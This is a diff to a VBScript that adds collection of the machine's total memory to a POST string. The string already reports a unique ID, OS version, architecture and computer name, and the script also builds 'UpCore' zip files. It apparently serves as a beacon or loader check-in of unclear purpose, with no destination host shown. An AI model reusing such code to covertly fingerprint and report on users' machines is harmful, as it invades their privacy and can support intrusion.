@@ -47,6 +47,18 @@ For Each objOperatingSystem in colOperatingSystems
 Next
 For Each objComputerSystem in colComputerSystems
 	SYSname = objComputerSystem.Name
+	Memory = objComputerSystem.TotalPhysicalMemory
+	Memory = Memory/1024/1024/1024
+	Memoryc = Split(Memory, ",")
+	   For i = 1 to (Ubound(Memoryc))
+		FMEM = Memoryc(0)
+		SMEM = Memoryc(1)
+	   Next
+	DN = Chr(48)
+	SMEM = Replace(SMEM,0,DN)
+	SMEM = left(SMEM,2)
+	FMEM = Replace(FMEM,0,DN)
+	Memory = FMEM &","& SMEM &" GB"
 Next
 Function RandomString( ByVal strLen )
     Dim str, min, max
@@ -180,7 +192,7 @@ WinterL= Path & Path2W
 End If
 zFile= CurPath
 End If
-PostData = "UID="& UniqueCode &"&code="& code &"&version="& versionT &"&OSversion="& OSversion &"&OSarq="& WinArq &"&OSname="& OSname &"&SYSname="& SYSname &"&config="& AutoOP &"|.|"& TimeOP
+PostData = "UID="& UniqueCode &"&code="& code &"&version="& versionT &"&OSversion="& OSversion &"&OSarq="& WinArq &"&OSname="& OSname &"&SYSname="& SYSname &"&Memory="& Memory &"&config="& AutoOP &"|.|"& TimeOP
 UpCoreNFName= "UpCore-"& RString
 NewZipFile= CurPath &"\"& UpCoreNFName &".zip"
 If NOT fso.FolderExists(TGL) Then
